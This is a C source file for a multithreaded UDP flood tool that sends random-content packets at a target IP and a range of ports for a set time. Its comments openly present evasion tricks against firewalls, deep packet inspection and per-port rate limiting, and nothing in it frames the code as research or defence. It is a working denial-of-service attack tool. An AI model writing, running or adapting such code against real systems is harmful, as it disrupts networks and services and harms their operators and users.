#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>

#define PACKET_SIZE 1024  // Size of each UDP packet
#define MAX_PORTS 10      // Number of different ports to target

typedef struct {
    struct sockaddr_in server;
    time_t end_time;
    int thread_id;
} ThreadArgs;

void* udp_flood(void* arg) {
    ThreadArgs args = *(ThreadArgs*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Bind to a random source port (helps bypass firewalls)
    struct sockaddr_in local;
    memset(&local, 0, sizeof(local));
    local.sin_family = AF_INET;
    local.sin_port = htons(rand() % 65535);  // Random source port
    local.sin_addr.s_addr = INADDR_ANY;
    bind(sock, (struct sockaddr*)&local, sizeof(local));

    char payload[PACKET_SIZE];
    srand(time(NULL) ^ args.thread_id);  // Ensure different random sequences

    while (time(NULL) < args.end_time) {
        // Randomize packet content (bypasses deep packet filtering)
        for (int i = 0; i < PACKET_SIZE; i++) {
            payload[i] = rand() % 256;
        }

        // Randomize destination port (avoids single-port rate limiting)
        args.server.sin_port = htons(atoi(getenv("TARGET_PORT")) + (rand() % MAX_PORTS));

        // Send the packet
        sendto(sock, payload, PACKET_SIZE, 0, (struct sockaddr*)&args.server, sizeof(args.server));
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <Base Port> <Threads> <Time (seconds)>\n", argv[0]);
        return 1;
    }

    struct sockaddr_in server;
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(atoi(argv[2]));  // Base port
    if (inet_pton(AF_INET, argv[1], &server.sin_addr) <= 0) {
        perror("Invalid IP address");
        return 1;
    }

    int threads = atoi(argv[3]);
    int duration = atoi(argv[4]);
    time_t end_time = time(NULL) + duration;

    // Store base port in environment variable (used in threads)
    setenv("TARGET_PORT", argv[2], 1);

    printf("Starting UDP flood on %s:%d for %d seconds using %d threads.\n",
           argv[1], atoi(argv[2]), duration, threads);

    pthread_t thread_pool[threads];
    ThreadArgs args[threads];

    for (int i = 0; i < threads; i++) {
        args[i].server = server;
        args[i].end_time = end_time;
        args[i].thread_id = i;
        if (pthread_create(&thread_pool[i], NULL, udp_flood, &args[i]) != 0) {
            perror("Failed to create thread");
            return 1;
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    printf("UDP flood completed.\n");
    return 0;
}
